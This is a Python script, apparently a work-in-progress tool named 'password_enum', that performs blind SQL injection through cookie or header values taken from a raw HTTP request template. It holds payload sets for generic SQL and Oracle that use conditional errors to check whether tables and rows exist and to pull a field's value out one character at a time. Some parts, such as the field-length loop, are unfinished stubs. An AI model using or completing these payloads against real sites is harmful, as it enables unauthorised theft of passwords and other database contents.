import email
from io import BytesIO
from http.server import BaseHTTPRequestHandler
import argparse
import io
from pprint import pprint
import sys
from urllib import response
import requests

from distutils.log import error
from ast import arg
from string import Template

parser = argparse.ArgumentParser("password_enum")

parser.add_argument(
    "--type", help="The method of injection to use.", choices=['error', 'dom', 'delay'], default='error')
parser.add_argument(
    "--success", help="A string to search for in the response that denotes successful execution.", type=str, default="Internal Server Error")
parser.add_argument(
    "--template", help="The request template used to contain the injection code.", type=str, default='template.txt')
parser.add_argument(
    "--wordlist", help="The wordlist used for payloads", type=str, default="wordlists/atob0to9.txt")
parser.add_argument(
    "--ssl", help="The wordlist used for payloads", action=argparse.BooleanOptionalAction)
# parser.add_argument(
#     "--url", help="The target URL.", type=str)

parser.add_argument(
    "table", help="The table containing the information to enumerate.", type=str)
parser.add_argument(
    "columnName", help="The column name used to match a record to enumerate.", type=str)
parser.add_argument(
    "columnValue", help="The column value used to match a record to enumerate.", type=str)
parser.add_argument(
    "fieldName", help="The field to enumerate.", type=str)

# Settings
MARKER = '[[INJECTION_POINT]]'
FIELD_LENGTH_LIMIT = 50

# SQL Commands
# 1 - When using conditional errors, if the error is present, we consider that as successful.
# 1 - When using conditional responses, if the --success string is present, we consider that as successful.
SQL = {
    'BASIC': "' || (SELECT '') || '",
    'CONDITIONAL_SUBSTRING_ENUM': "' || (SELECT CASE WHEN SUBSTR($field_name,$index,1)='$value' THEN to_char(1/0) ELSE '' END FROM $table WHERE $columnName='$columnValue')||",
    'TABLE_CHECK': "' || (SELECT '' FROM $tableName) || '",
    'COLUMN_CHECK': "' || (SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE $columnName='$columnValue')||'"
}
ORACLE = {
    'BASIC': "' || (SELECT '' from dual) || '",
    'CONDITIONAL_SUBSTRING_ENUM': "' || (SELECT CASE WHEN SUBSTR($field_name,$index,1)='$value' THEN to_char(1/0) ELSE '' END FROM $table WHERE $columnName='$columnValue')||",
    'TABLE_CHECK': "' || (SELECT '' FROM $tableName WHERE ROWNUM = 1) || '",
    'COLUMN_CHECK': "' || (SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE $columnName='$columnValue')||'"
}

args = parser.parse_args()

tableName = args.table
columnName = args.columnName
columnValue = args.columnValue
target = args.fieldName

try:
    wlFile = open(args.wordlist, "r")
except FileNotFoundError:
    error("Wordlist does not exists!")
else:
    values = wlFile.read()
    payloadValues = values.split(',')
    wlFile.close()

try:
    templateFile = open(args.template, "r")
except FileNotFoundError:
    error("Template does not exists!")
    template = ''
else:
    template = templateFile.read()
    templateFile.close()

request_line, headers_alone = template.split('\n', 1)

message = email.message_from_file(io.StringIO(headers_alone))
protocol = "https://" if args.ssl else "http://"
headers = dict(message.items())
url = f"{protocol}{headers['Host']}{request_line.replace('GET ', '').replace(' HTTP/1.1', '')}"
dbVersion = "UNKNOWN"


def isSqlCompatible():
    global dbVersion
    print("Checking SQL is being used")
    inject(SQL["BASIC"], False)
    if not executeRequestAndReturnsError():
        dbVersion = "SQL"
        return True

    inject(ORACLE["BASIC"], False)
    if not executeRequestAndReturnsError():
        dbVersion = "ORACLE"
        return True

    return False


def getSQLCommand(key):
    match dbVersion:
        case "SQL":
            return SQL[key]
        case "ORACLE":
            return ORACLE[key]
        case _:
            print(f"Unknow database version detected, exiting as this is not supported.")
            sys.exit()


def checkTableExists(tableName):
    print("Checking table exists")
    inject("TABLE_CHECK")

    return False if executeRequestAndReturnsError() else True


def checkRowExists(tableName, columnName, columnValue):
    print("Checking row exists")
    inject("COLUMN_CHECK")

    return False if executeRequestAndReturnsError() else True


def enumerateFieldLength(tableName, columnExists):
    print("Getting field length...")
    for x in range(FIELD_LENGTH_LIMIT):
        print("Checking length ", x)


def inject(sqlKey, autolookup=True):
    global headers

    orgSql = getSQLCommand(sqlKey) if autolookup else sqlKey
    sql = Template(orgSql)

    safeSql = sql.safe_substitute(
        tableName=tableName, columnName=columnName, columnValue=columnValue)

    for header, value in message.items():
        if MARKER in value:
            headers[header] = value.replace(MARKER, safeSql)


# Returns TRUE if success string is found in response.text
def executeRequestAndReturnsError():

    cookies = dict()
    orgCookies = headers['Cookie'].split(';')

    for cookie in orgCookies:
        orgCookieValues = cookie.split("=", 1)
        cookies.update({orgCookieValues[0]: orgCookieValues[1]})
    response = requests.get(url, cookies=cookies)

    print(f"Sending: {cookies}")
    result = args.success in response.text
    return result


if not isSqlCompatible():
    print(f"{target} appears to not be process commands as SQL")
    sys.exit()
else:
    print("SQL seems supported!")

if not checkTableExists(tableName):
    print(f"Table {tableName} does not exist!")
    sys.exit()
else:
    print(f"{tableName} is present!")

if not checkRowExists(tableName, columnName, columnValue):
    print(
        f"Then entry with identifer {columnName} does not exist with a value of {columnValue}!")
    sys.exit()
else:
    print(f"Entry has {columnName}={columnValue}")
